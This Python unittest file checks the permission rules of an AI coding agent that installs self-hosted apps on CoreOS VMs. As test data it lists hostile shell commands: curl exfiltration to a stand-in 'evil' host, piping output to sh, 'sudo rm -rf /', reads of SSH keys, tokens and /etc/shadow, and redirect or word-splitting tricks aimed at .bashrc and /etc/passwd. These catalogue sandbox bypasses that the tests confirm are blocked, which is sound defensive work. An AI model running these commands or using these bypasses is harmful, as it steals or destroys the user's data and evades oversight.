import re
import sys
import unittest
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
from layout import SKILLS_DIR  # noqa: E402

AGENT = ROOT / ".opencode" / "agents" / "fcos-app-installer.md"
COMMAND = ROOT / ".opencode" / "commands" / "add-service.md"


def frontmatter(text: str) -> str:
    match = re.match(r"^---\n(.*?)\n---\n", text, re.S)
    if not match:
        raise AssertionError("missing frontmatter")
    return match.group(1)


def rules(text: str) -> list[tuple[str, str, str]]:
    """(action, resource, effect) in order, from the YAML permission list. Parsed as YAML, not
    matched as text: rulesync writes the file its own way (quotes, folding, no comments)."""
    permissions = yaml.safe_load(frontmatter(text))["permissions"]
    return [(rule["action"], rule["resource"], rule["effect"]) for rule in permissions]


def effect(text: str, action: str, resource: str) -> str:
    """Last matching rule wins, as in OpenCode; whole-value * and ? wildcards."""
    def glob(pattern: str) -> str:
        return re.escape(pattern).replace(r"\*", ".*").replace(r"\?", ".")

    result = "ask"
    for a, r, e in rules(text):
        a_re = "^" + glob(a) + "$"
        # A shell pattern ending in " *" also matches the bare command.
        r_re = "^" + (glob(r[:-2]) + "(?: .*)?" if r.endswith(" *") else glob(r)) + "$"
        if re.match(a_re, action) and re.match(r_re, resource, re.S):
            result = e
    return result


def body(text: str) -> str:
    """The agent's instructions as the model gets them: the prompt plus the folder's AGENTS.md,
    where rulesync puts the rule files (tests/test_rules.py checks what is in it)."""
    rules_text = (ROOT / "AGENTS.md").read_text()
    return text.split("\n---\n", 1)[1] + "\n" + " ".join(rules_text.split())


class AgentTests(unittest.TestCase):
    def setUp(self):
        self.text = AGENT.read_text()

    def test_is_primary_v2_agent(self):
        fm = frontmatter(self.text)
        self.assertIn("mode: primary", fm)
        self.assertIn("description:", fm)
        self.assertIn("permissions:", fm)
        for legacy in ("permission:", "tools:", "maxSteps:", "temperature:"):
            self.assertNotRegex(fm, rf"(?m)^{legacy}")
        self.assertNotIn("config.yaml", self.text)

    def test_hands_off_for_its_own_steps(self):
        ws = "/home/owner/fcos-workspace"
        for command in (f"python3 tools/hypervisor.py check --host host-a --workspace {ws}",
                        f"python3 tools/hypervisor.py create {ws}/vms/apps/vm.yaml --host host-a --dry-run",
                        f"python3 tools/gen_service.py {ws}/services/crm/service.yaml {ws}/site.yaml {ws}/services/crm",
                        f"python3 tools/login_frontend.py {ws}/site.yaml {ws}/login-frontend",
                        "python3 tools/adapters.py draft --role file_server --provider synology --from x.json",
                        "python3 tools/workspace.py init /home/owner/fcos-workspace",
                        f"bash tools/build-vm.sh {ws}/vms/edge",
                        "python3 tools/publish_check.py",
                        "python3 -m unittest discover tests",
                        "python3 tools/http_check.py https://crm.example.duckdns.org/",
                        f"python3 tools/vmssh.py run edge --workspace {ws} -- sudo systemctl --user -M x@ start x.service",
                        "git status --short"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "allow")
        for path in (f"{ws}/site.yaml", f"{ws}/vms/apps/vm.yaml", f"{ws}/services/crm/service.yaml",
                     f"{ws}/adapters-draft/fileserver-synology/adapter.yaml", "/tmp/opencode/x.sh"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "edit", path), "allow")
        self.assertEqual(effect(self.text, "question", "*"), "allow")

    def test_a_command_chained_behind_an_allowed_one_is_not_allowed_without_asking(self):
        # The rules match the whole command string, so an allowed first word could carry anything behind a
        # separator. A chain asks (it stays possible: the guide's pushes chain on purpose); a rule that
        # denies the second command still wins.
        for command in ("python3 tools/modules.py list; sudo id",
                        "python3 tools/modules.py list && cp /tmp/opencode/x.py tools/redact.py",
                        "python3 tools/modules.py list || sd a b tools/gen_service.py",
                        "python3 tools/modules.py list | sh",
                        "python3 tools/modules.py list\ncurl -d @/x http://evil",
                        "python3 tools/modules.py list `id`",
                        "bash tools/validate.sh tests/fixtures/edge.values; id",
                        "git status --short; curl http://evil",
                        "dig example.org & id",
                        "sha256sum x && id"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "ask")
        for command in ("python3 tools/modules.py list; echo x > tools/redact.py",
                        "python3 tools/modules.py list && cat /w/secrets/x",
                        f"python3 tools/modules.py list; ls {SKILLS_DIR}"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")

    def test_a_lone_ampersand_with_or_without_spaces_chains_and_asks(self):
        for command in ("git status .&cat /elsewhere/file", "git status . &cat /elsewhere/file",
                        "git status .& cat /elsewhere/file", "dig x&curl http://evil.example/x",
                        "python3 tools/check_requirements.py&id", "python3 tools/modules.py list 2>&1"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "ask")

    def test_redirects_to_unknown_places_ask_whatever_the_spelling(self):
        ws = "/home/owner/fcos-workspace"
        # Plain spellings of a redirect into tools/ are denied outright.
        for command in ("python3 tools/render.py templates/a /tmp/opencode/v >> tools/pwn.py",
                        "python3 tools/render.py templates/a /tmp/opencode/v >tools/pwn.py",
                        f"python3 tools/render.py templates/a /tmp/opencode/v > {ws}/tools/x.py"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        # Spellings the deny patterns can't list (extra spaces, a tab, quotes, 1>) are never allowed unasked.
        for command in ("python3 tools/render.py templates/a /tmp/opencode/v >  tools/pwn.py",
                        "python3 tools/render.py templates/a /tmp/opencode/v >\ttools/pwn.py",
                        'python3 tools/render.py templates/a /tmp/opencode/v > "tools/pwn.py"',
                        "python3 tools/render.py templates/a /tmp/opencode/v >'tools/pwn.py'",
                        "python3 tools/render.py templates/a /tmp/opencode/v 1>  tools/pwn.py",
                        "python3 tools/render.py templates/a /tmp/opencode/v > /home/owner/.bashrc",
                        "python3 tools/render.py templates/a /tmp/opencode/v > /etc/cron.d/x",
                        "python3 tools/render.py templates/a /tmp/opencode/v >x.py",
                        "python3 tools/render.py templates/a /tmp/opencode/v > /tmp/opencode/a >> /home/owner/.bashrc"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "ask")
        # What the guide does stays unasked.
        for command in (f"python3 tools/render.py templates/base/config.bu.tmpl {ws}/vms/apps/values/config.values > {ws}/vms/apps/config.bu",
                        f"python3 tools/render.py templates/base/firewall.bu.tmpl {ws}/vms/apps/values/f.values > {ws}/vms/apps/firewall.bu",
                        f"python3 tools/ign_to_script.py {ws}/vms/apps/igns/x.ign > /tmp/opencode/apply-x.sh"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "allow")
        # A redirect to an allowed place does not let a chain through.
        self.assertEqual(effect(self.text, "shell", f"python3 tools/modules.py list; id > /tmp/opencode/a"), "ask")

    def test_an_allowed_redirect_target_cannot_climb_out_or_borrow_a_later_word(self):
        ws = "/home/owner/fcos-workspace"
        # `..` anywhere after a redirect is never needed.
        for command in ("git status . > /tmp/opencode/../../home/owner/.bashrc",
                        f"git status . > {ws}/vms/../.bashrc",
                        "git log -1 --format=PAYLOAD > /tmp/opencode/../../home/owner/.bashrc",
                        "git status . > /tmp/opencode/../../home/owner/fcos-app/t*s/x.py",
                        "git status . > /tmp/opencode/../../home/owner/fcos-app/tool?/x.py"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        # The workspace folders are allowed only for the redirect's own target, not for a later word.
        for command in ("git status . > /home/owner/.bashrc /vms/x", "git status . > /home/owner/.bashrc x/services/y",
                        "git status . > /home/owner/.profile /login-frontend/z",
                        "git status . > /home/owner/.ssh/vms/x", "git status . > $HOME/.config/services/x",
                        "git status . > ~/.bashrc", "git status . > /tmp/opencode/.hidden"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "ask")
        for command in (f"python3 tools/render.py templates/a {ws}/v > {ws}/vms/apps/a.bu",
                        "python3 tools/render.py templates/a $ws/vms/$vm/values/a.values > $ws/vms/$vm/a.bu",
                        f"python3 tools/ign_to_script.py {ws}/vms/apps/igns/x.ign > /tmp/opencode/apply-x.sh"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "allow")

    def test_git_and_dig_cannot_be_pointed_at_files_outside_the_checkout(self):
        for command in ("git diff /dev/null /home/owner/.ssh/id_ed25519", "git diff --stat /etc/passwd",
                        "git diff --no-ind /dev/null x", "git diff --no-i a b", "git diff ../other/file",
                        "git diff HEAD..HEAD~3", "git diff ~/.ssh/config", "git diff $HOME/x", "git diff . $x",
                        "git log --no-index /etc/passwd", "git log -p /etc/passwd", "git log $HOME/x",
                        "dig -f/etc/shadow", "dig -k/etc/shadow", "dig x -ffile", "dig x -kfile",
                        "dig @192.0.2.1 -f /etc/passwd"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        for command in ("git diff --cached .", "git diff .", "git diff --stat .", "git status .", "git log -3 --oneline",
                        "dig login-frontend.example.org", "dig +short fs-kvm.example.org", "dig @192.0.2.1 a.example.org"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "allow")

    def test_allowed_commands_cannot_read_arbitrary_files_through_their_own_options(self):
        for command in ("git diff --no-index /dev/null /home/owner/other/file", "git diff --no-index a b",
                        "dig -f /home/owner/other/file", "dig -k /home/owner/other/file", "dig x -f /etc/passwd"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        self.assertEqual(effect(self.text, "shell", "dig login.example.org"), "allow")
        self.assertEqual(effect(self.text, "shell", "git diff --stat"), "allow")

    def test_the_workspace_edit_allows_do_not_reach_the_toolkits_own_folders(self):
        ws = "/home/owner/fcos-workspace"
        for path in (f"{ws}/vms/apps/vm.yaml", f"{ws}/services/crm/service.yaml", f"{ws}/site.yaml",
                     f"{ws}/login-frontend/rendered/x.bu", "/tmp/opencode/x.sh"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "edit", path), "allow")
        for path in ("/h/tk/templates/vms/evil.tmpl", "/h/tk/docs/guide/services/x.md",
                     "/h/tk/schemas/services/x.md", "/h/tk/templates/login-frontend/x.tmpl"):
            with self.subTest(path=path):
                self.assertNotEqual(effect(self.text, "edit", path), "allow")

    def test_never_touches_the_users_systems(self):
        for command in ("qm set 201 --delete scsi0", "pvesm add dir coreos", "pveum role list",
                        "pvesh get /nodes", "ssh root@192.0.2.5 qm list", "scp vms/x.ign root@192.0.2.5:/var/coreos/",
                        "git push origin main", "sudo rm -rf /",
                        "curl -s https://192.0.2.21:8006/api2/json/nodes",
                        "curl -s -H 'Authorization: PVEAPIToken=x' https://pve/",
                        "cat /home/owner/fcos-workspace/secrets/proxmox-host-a.token",
                        "cat secrets/x"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")

    def test_every_vm_setting_is_decided_and_shown(self):
        text = " ".join(body(self.text).split())
        for needle in ("Every VM setting matters", "settings table", "never leave a setting to the platform's default"):
            self.assertIn(needle, text)

    def test_question_rules_from_the_trial_run(self):
        # The only text box is the tool's own "Other" entry; sizes show
        # what's free with every VM running, the official figures, and the lowest safe amount.
        text = " ".join(body(self.text).split())  # wording may wrap across lines
        self.assertIn('pick "Other" and type', text)
        self.assertIn("never an option that means \"type it\"", text)
        for needle in ("every machine and container on the server running", "official docs recommend",
                       "lowest amount"):
            self.assertIn(needle, text)
        questions = " ".join((ROOT / "docs" / "guide" / "questions.md").read_text().split())
        for needle in ('"Other"', "every machine and container on the server running",
                       "official docs recommend", "lowest amount"):
            self.assertIn(needle, questions)

    def test_final_report_says_how_to_ssh_in_and_admin_commands_start_in_the_root_folder(self):
        text = " ".join(body(self.text).split())
        report = text.split("## Final report", 1)[1].split(" ## ", 1)[0]
        self.assertIn("how to get a shell on the VM", report)
        self.assertIn("Getting a shell on the VM", report)  # the section of the app's ids.md it points at
        self.assertIn("ssh <admin>@<VM address>", report)
        # A note that shows a command run as the app's account starts with `cd /`, or sudo fails in the admin's home.
        self.assertIn("starts with `cd /`", text)

    def test_workspace_folders_named_fcos_are_open_but_secrets_never(self):
        # Any folder whose name contains "fcos-".
        for ws in ("/home/owner/fcos-workspace", "/home/owner/AI/fcos-trial"):
            with self.subTest(ws=ws):
                self.assertEqual(effect(self.text, "external_directory", f"{ws}/site.yaml"), "allow")
                self.assertEqual(effect(self.text, "external_directory", f"{ws}/hosts/a/discovery.txt"), "allow")
                self.assertEqual(effect(self.text, "external_directory", f"{ws}/secrets"), "deny")
                self.assertEqual(effect(self.text, "external_directory", f"{ws}/secrets/x.token"), "deny")
        for other in ("/home/owner/Documents/taxes.pdf", "/etc/passwd",
                      # "*" crosses "/": hidden folders and /tmp go back to asking.
                      "/home/owner/.ssh/fcos-proxmox", "/home/owner/.config/fcos-x/a",
                      "/home/owner/.cache/fcos-y", "/tmp/x-fcos-y/site.yaml", "/tmp/fcos-a/vms/x"):
            with self.subTest(other=other):
                self.assertEqual(effect(self.text, "external_directory", other), "ask")
        self.assertEqual(effect(self.text, "external_directory", "/tmp/opencode/fcos-x.json"), "allow")

    def test_known_bypasses_are_closed(self):
        ws = "/home/owner/fcos-workspace"
        for command in (f"rg -uu . {ws}/secrets", f"rg token {ws}/secrets/", f"sha256sum {ws}/secrets/x",
                        f"rg -uu . {ws}", f"rg --no-ignore token {ws}", f"rg --unrestricted . {ws}",
                        "python3 tools/../../../../tmp/opencode/x.py", "bash tools/../evil.sh",
                        "rm -f /tmp/opencode/../../home/owner/agent/README.md",
                        "ssh -l root 192.0.2.5 qm list", "ssh -lroot 192.0.2.5", "ssh -o User=root 192.0.2.5",
                        "git log --output=/tmp/x", "git diff --output=x"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        for path in (f"{ws}/secrets", f"{ws}/secrets/proxmox-host-a.token"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "external_directory", path), "deny")
        for command in ("rm -f /tmp/opencode/x README.md .git/index",
                        "python3 -m unittest discover -s /tmp/opencode",
                        "python3 -m unittest /tmp/opencode/test_x.py",
                        "python3 -m unittest tests.test_proxmox /tmp/opencode/x.py",
                        "ssh -l 'root' 192.0.2.5", "ssh -l \"root\" 192.0.2.5", "ssh -l'root' 192.0.2.5",
                        "ssh -o 'User root' 192.0.2.5",
                        "ssh-keygen -R 192.0.2.20 -f /home/owner/agent/README.md"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        # Searching and fetching need the user's OK: rg could walk into secrets/,
        # and curl has too many ways to send or write data.
        for command in (f"rg . {ws}", f"rg token {ws}", "curl -s -o /dev/null -d@x https://x",
                        "curl -sI https://auth.example.duckdns.org/", "curl -s https://x"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "ask")
        # The verification commands the guide uses still run hands-off.
        for command in ("python3 tools/http_check.py --timeout 3 http://192.0.2.30:8110/",
                        "python3 tools/http_check.py https://crm.example.duckdns.org/",
                        "python3 tools/workspace.py where",
                        "python3 -m unittest discover tests",
                        "python3 -m unittest tests.test_proxmox",
                        "ssh-keygen -R 192.0.2.20",
                        "python3 tools/adapters.py render --role router_firewall --provider opnsense --step reserve_ip --values /tmp/opencode/v.json"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "allow")
        self.assertEqual(effect(self.text, "edit", "tests/fixtures/services/crm.yaml"), "ask")

    def test_prompt_says_how_to_run_the_guides_desktop_commands(self):
        text = body(self.text)
        self.assertIn("bash equivalent", text)
        self.assertIn("tools/http_check.py", text)

    def test_prompt_names_real_commands(self):
        text = body(self.text)
        self.assertIn("python3 tools/workspace.py where", text)
        self.assertIn("python3 tools/workspace.py previous", text)
        self.assertIn("python3 tools/adapters.py show", text)
        self.assertIn("python3 tools/adapters.py render", text)
        self.assertIn("python3 tools/hypervisor.py list", text)
        self.assertNotRegex(text, r"`python3 tools/workspace\.py`")

    def test_search_tool_asks(self):
        # The built-in search could reach secrets/ through its file filter.
        for pattern in ("token", "*", "PVEAPIToken"):
            with self.subTest(pattern=pattern):
                self.assertEqual(effect(self.text, "grep", pattern), "ask")

    def test_denies_are_not_too_broad(self):
        for command in ("ssh-keygen -R login-frontend.lan", "ssh-keygen -R 192.0.2.20"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "allow")
        self.assertEqual(effect(self.text, "shell", "rg -n podman-auto-update templates"), "ask")
        for command in ("rg -u x .", "rg -uu x .", "rg --unrestricted x .", "ssh-keygen -R h -f /x",
                        "ssh-keygen -R h x"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")

    def test_old_workspaces_get_the_ignore_file(self):
        self.assertIn("python3 tools/workspace.py init <path>", body(self.text).split("2. **Earlier")[0])
        self.assertIn("every run", body(self.text).split("2. **Earlier")[0])

    def test_every_rule_is_parsed(self):
        # A rule the parser can't read would silently go untested.
        fm = frontmatter(self.text)
        self.assertEqual(fm.count("- action:"), len(rules(self.text)))

    def test_never_reads_secrets(self):
        for path in ("/home/owner/fcos-workspace/secrets/proxmox-host-a.token", "/x/secrets/y",
                     "/somewhere/proxmox-host-a.token"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "read", path), "deny")
                self.assertEqual(effect(self.text, "edit", path), "deny")

    def test_user_approves_commits_and_downloads(self):
        for command in ("git commit -m x", "docker pull quay.io/x", "curl -fLO https://x", "curl -s -O https://x"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "ask")
        self.assertEqual(effect(self.text, "shell", "some-unknown-tool --flag"), "ask")

    def test_no_shell_writes_into_the_skills(self):
        # The user runs the skills' host scripts as root.
        for command in (f"python3 tools/render.py t v > {SKILLS_DIR}/hypervisor-proxmox/scripts/lib.sh",
                        f"python3 tools/render.py t v >{SKILLS_DIR}/x/SKILL.md",
                        f"python3 tools/x.py | tee {SKILLS_DIR}/x/adapter.yaml",
                        f"python3 tools/gen_service.py s site {SKILLS_DIR}/x"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        self.assertEqual(effect(self.text, "edit", f"{SKILLS_DIR}/hypervisor-proxmox/scripts/lib.sh"), "ask")
        self.assertEqual(effect(self.text, "edit", f"/home/x/AI/toolkit/{SKILLS_DIR}/a/SKILL.md"), "ask")

    # Only its own skills plus an approved list, so the others' descriptions
    # aren't sent with every request; MCP servers it doesn't need are denied (Exa stays, for research).
    ALLOWED_SKILLS = ("hypervisor-proxmox", "router-opnsense", "fileserver-truenas", "dns-duckdns",
                      "ingress-traefik", "authgw-authentik", "adapter-generic",
                      "researching-apps-for-self-hosting", "opencode",
                      "package-management", "search", "exa-agent", "docker-compose-patterns",
                      "docker-destructive-guardrails", "systematic-debugging", "verification-before-completion")

    def test_skills_are_filtered(self):
        for skill in self.ALLOWED_SKILLS:
            with self.subTest(skill=skill):
                self.assertEqual(effect(self.text, "skill", skill), "allow")
        # The old adapter-<product> names are not loaded from an install that still has those folders.
        for skill in ("eli5", "brainstorming", "frontend-design", "axolotl", "career-intake", "humanizer",
                      "adapter-proxmox", "adapter-opnsense", "adapter-truenas", "adapter-duckdns"):
            with self.subTest(skill=skill):
                self.assertEqual(effect(self.text, "skill", skill), "deny")

    def test_overrides_of_global_rules_are_short_and_cover_the_clashes(self):
        # Global AGENTS.md always loads and can't be switched off by a folder (OpenCode V2
        # Instructions: "combined rather than used as overrides"), so the clashes are overridden
        # here, briefly (not a lot of tokens).
        prompt = AGENT.read_text().split("\n---\n", 1)[1]
        section = prompt.split("## Overrides of global rules", 1)[1].split("\n## ", 1)[0]
        lines = [l for l in section.strip().splitlines() if l.strip()]
        self.assertLessEqual(len(lines), 6, section)
        text = " ".join(section.split())
        for needle in ("memory tools", "workspace", "in scope", "without asking", "adapter-drafter"):
            self.assertIn(needle, text)

    def test_how_to_work_matches_the_shared_section(self):
        # The agent body replaces OpenCode's base prompt; the user's other agents carry this
        # section (instructions-unclear agents/generate.py BASE_INSTRUCTIONS, adapted from
        # OpenCode 2.1.3's system prompt, MIT).
        prompt = AGENT.read_text()
        self.assertIn("## How to work", prompt)
        for needle in ("Rules files and skills give more specific procedures; follow them.",
                       "Run independent tool calls in parallel.",
                       "Treat unfamiliar files or changes as potential user work"):
            self.assertIn(needle, prompt)

    def test_relative_secret_paths_are_denied_too(self):
        # V2 reads inside the location use relative paths,
        # which "*/secrets/*" doesn't match.
        for action, path in (("read", "secrets/agent-ssh/edge/id_ed25519"), ("read", "secrets"),
                             ("edit", "secrets/x.token"), ("edit", "secrets")):
            with self.subTest(action=action, path=path):
                self.assertEqual(effect(self.text, action, path), "deny")
        for command in ("cat secrets/proxmox-a.token", "ls secrets", "ls -la secrets/"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")
        self.assertNotEqual(effect(self.text, "read", "services/crm/secrets.md"), "deny")

    def test_overrides_cover_document_tools(self):
        section = AGENT.read_text().split("## Overrides of global rules", 1)[1].split("\n## ", 1)[0]
        self.assertIn("Docling", section)

    def test_file_name_search_stays_out_of_secrets(self):
        # Glob had no rule, so it could list secret file names.
        # OpenCode V2 matches glob rules against the requested pattern (Permissions docs).
        for pattern in ("**/secrets/*", "secrets/**", "/home/owner/fcos-installs/home/secrets/*", "**/*.token"):
            with self.subTest(pattern=pattern):
                self.assertEqual(effect(self.text, "glob", pattern), "deny")
        self.assertNotEqual(effect(self.text, "glob", "**/*.md"), "deny")

    def test_frontmatter_is_valid_yaml_with_every_rule(self):
        # A YAML mistake would make OpenCode drop the whole permission list.
        import yaml
        for path in (AGENT, ROOT / ".opencode" / "agents" / "adapter-drafter.md"):
            with self.subTest(agent=path.name):
                text = path.read_text()
                data = yaml.safe_load(frontmatter(text))
                parsed = [(p["action"], p["resource"], p["effect"]) for p in data["permissions"]]
                self.assertEqual(parsed, rules(text))
        self.assertIn(("pmb_*", "*", "deny"), rules(self.text))

    def test_unneeded_mcp_servers_are_denied(self):
        for action in ("pmb_record_batch", "docling_convert_directory_files_into_docling_document",
                       "presenton_generate", "freecad_create", "codebase_memory_mcp_search", "podman_run",
                       "zap_scan", "rea_open", "reva_list", "radare2_open"):
            with self.subTest(action=action):
                self.assertEqual(effect(self.text, action, "*"), "deny")
        self.assertNotEqual(effect(self.text, "exa_web_search_exa", "*"), "deny")
        # Never a blanket *_* rule: built-in actions such as external_directory contain an underscore.
        self.assertNotIn(("*_*", "*", "deny"), rules(self.text))
        self.assertEqual(effect(self.text, "external_directory", "/home/owner/fcos-installs/home/site.yaml"), "allow")

    def test_may_start_only_the_adapter_drafter(self):
        self.assertEqual(effect(self.text, "subagent", "adapter-drafter"), "allow")
        self.assertEqual(effect(self.text, "subagent", "general"), "deny")
        self.assertIn("adapter-drafter", body(self.text))

    def test_private_and_shared_files_protected(self):
        self.assertEqual(effect(self.text, "read", "notes/Fedora CoreOS (FCOS).md"), "deny")
        self.assertEqual(effect(self.text, "edit", "notes/x.md"), "deny")
        self.assertEqual(effect(self.text, "edit", ".opencode/agents/fcos-app-installer.md"), "deny")
        for path in ("templates/base/firewall.bu.tmpl", "tools/render.py", "docs/guide/03-add-a-service.md",
                     f"{SKILLS_DIR}/hypervisor-proxmox/adapter.yaml", f"{SKILLS_DIR}/ingress-traefik/spec.yaml"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "edit", path), "ask")

    def test_prompt_states_the_rules(self):
        text = body(self.text)
        for phrase in ("docs/guide/README.md", "docs/guide/questions.md", "publish_check.py", "which server",
                       "5 GB", "[Manual]", "secret", "workspace", "tools/hypervisor.py", "tools/adapters.py",
                       "tools/gen_service.py", "tools/login_frontend.py", "reference.md"):
            with self.subTest(phrase=phrase):
                self.assertIn(phrase.lower(), text.lower())

    def test_prompt_rules_from_the_plan(self):
        text = body(self.text)
        for phrase in ("teardown_api_access", "ends its turn", "plain language", "questions.md",
                       "draft an adapter", "never commit after an install"):
            with self.subTest(phrase=phrase):
                self.assertIn(phrase, text)
        # Workspace first: the workspace question comes before anything else is read or asked.
        self.assertLess(text.index("Where should I keep"), text.index("docs/guide/README.md"))

    def test_prompt_rules_from_the_owner(self):
        text = body(self.text)
        for phrase in ("discovery", "never assume", "one at a time", "official", "forum",
                       "dry run", "fish", "bash", "checksum", "Okta-style", "break-glass",
                       "check the history"):
            with self.subTest(phrase=phrase):
                self.assertIn(phrase.lower(), text.lower())

    def test_prompt_follows_the_design_run_order(self):
        text = body(self.text)
        steps = ["Where to keep the files", "Earlier installs", "Which systems", "Hypervisor access",
                 "Where the service goes", "Login page", "Research", "User decisions", "Manual steps",
                 "Build, push, verify", "Adapter draft"]
        positions = [text.index(s) for s in steps]
        self.assertEqual(positions, sorted(positions))


class ReviewFixTests(unittest.TestCase):
    """Gaps found in review in the hand-written permission list and its prompt."""

    def setUp(self):
        self.text = AGENT.read_text()

    def test_nothing_under_the_agent_folder_is_writable_even_in_a_tools_subfolder(self):
        # "*/tools/*" asks, so the .opencode denies must come after it; otherwise it would win for these.
        for path in (".opencode/agents/tools/evil.md", ".opencode/commands/tools/evil.md",
                     "/h/tk/.opencode/commands/tools/evil.md", "/h/tk/.opencode/agents/tools/x/y.md",
                     "/h/tk/.opencode/agents/evil.md", "/h/tk/.opencode/commands/evil.md"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "edit", path), "deny")
        # A skill's files are still the user's to approve.
        for path in (f"/h/tk/{SKILLS_DIR}/adapter-x/SKILL.md", f"/h/tk/{SKILLS_DIR}/adapter-x/tools/y.sh"):
            with self.subTest(path=path):
                self.assertEqual(effect(self.text, "edit", path), "ask")

    def test_the_override_section_settles_the_secure_coding_rule_about_reading_secrets(self):
        # The user's global secure-coding rule says to read secrets from the environment or a
        # secret store; this agent must not.
        section = " ".join(self.text.split("## Overrides of global rules", 1)[1].split("## How to work", 1)[0].split())
        self.assertIn("secure-coding rule", section)
        self.assertIn("never read an environment", section)

    def test_it_may_start_the_adapter_drafter_and_nothing_else(self):
        # A subagent runs with its own permissions, not this agent's: explore can run ssh and read
        # secrets/, security can edit the host scripts and their checksum list, and second-opinion
        # and plan are primary agents that cannot be started at all.
        self.assertEqual(effect(self.text, "subagent", "adapter-drafter"), "allow")
        for name in ("second-opinion", "security", "plan", "explore", "general", "evaluator", "metacognitive",
                     "security-auditor", "threat-modeling-expert", "build"):
            with self.subTest(name=name):
                self.assertEqual(effect(self.text, "subagent", name), "deny")
        prompt = " ".join(self.text.split("\n---\n", 1)[1].split())
        self.assertIn("Hand work only to `adapter-drafter`", prompt)

    def test_removing_its_own_scratch_file_is_allowed_and_extra_arguments_are_not(self):
        for name in ("apply-edge.sh", "apply-login-frontend.sh", "apply-crm.sh"):
            self.assertEqual(effect(self.text, "shell", f"rm -f /tmp/opencode/{name}"), "allow")
        # Nothing but a generated apply script: not a bare glob, not another scratch file.
        for command in ("rm -f /tmp/opencode/*", "rm -f /tmp/opencode/other.txt", "rm -f /tmp/opencode/a*"):
            with self.subTest(command=command):
                self.assertNotEqual(effect(self.text, "shell", command), "allow")
        for command in (
                # An expansion the shell makes after the rules matched can split one word into two:
                "rm -f /tmp/opencode/apply-x$PS4/etc/passwd", "rm -f /tmp/opencode/apply-x$({printf,'\\040/etc/passwd'})",
                "rm -f /tmp/opencode/apply-x`echo /etc/passwd`", "rm -f /tmp/opencode/apply-x{,/../../etc/passwd}",
                "rm -f /tmp/opencode/apply-x$(echo)", "rm -f /tmp/opencode/apply-x'/etc/passwd'","rm -f /tmp/opencode/a /etc/passwd", "rm -f /tmp/opencode/a b",
                        "rm -f /tmp/opencode/*..*", "rm -f /tmp/opencode/a ../b",
                        # The shell splits on a tab or $IFS as on a space, and a redirect truncates a file.
                        "rm -f /tmp/opencode/a\t/etc/passwd", "rm -f /tmp/opencode/a${IFS}/etc/passwd",
                        "rm -f /tmp/opencode/a$IFS/etc/passwd", "rm -f /tmp/opencode/a>/home/o/file"):
            with self.subTest(command=command):
                self.assertEqual(effect(self.text, "shell", command), "deny")

    def test_the_commit_section_warns_about_the_words_the_rules_deny(self):
        section = " ".join(self.text.split("## Commits", 1)[1].split("## Final report", 1)[0].split())
        for word in (".opencode", "host-script", ".sha25", "git commit -F"):
            with self.subTest(word=word):
                self.assertIn(word, section)
        self.assertIn("git add .", section)
        self.assertNotIn("git add -A", section)
        # Without a path, status and diff list the whole enclosing checkout, which add . does not stage.
        self.assertIn("git status .", section)
        self.assertIn("git diff --cached .", section)  # plain `git diff .` shows nothing once staged
        self.assertNotIn("show the same files", section)
        self.assertEqual(effect(self.text, "shell", "git status ."), "allow")
        self.assertEqual(effect(self.text, "shell", "git diff --cached ."), "allow")
        # The rules really do deny a commit message holding any of them.
        for message in ("git commit -m 'Update host-scripts list'", "git commit -m 'drop .opencode'",
                        "git commit -m 'refresh the .sha256 list'"):
            with self.subTest(message=message):
                self.assertEqual(effect(self.text, "shell", message), "deny")
        self.assertEqual(effect(self.text, "shell", "git commit -F /tmp/opencode/msg.txt"), "ask")
        self.assertEqual(effect(self.text, "shell", "git add ."), "ask")  # staging is the user's call


class CommandTests(unittest.TestCase):
    def test_command_uses_agent(self):
        text = COMMAND.read_text()
        fm = frontmatter(text)
        self.assertIn("agent: fcos-app-installer", fm)
        self.assertIn("description:", fm)
        self.assertIn("$1", text)
        self.assertNotIn("$2", text)  # the VM is asked, not an argument
        self.assertNotIn("config.yaml", text)
        self.assertNotIn("!`", text)  # no shell blocks fed with arguments


if __name__ == "__main__":
    unittest.main()
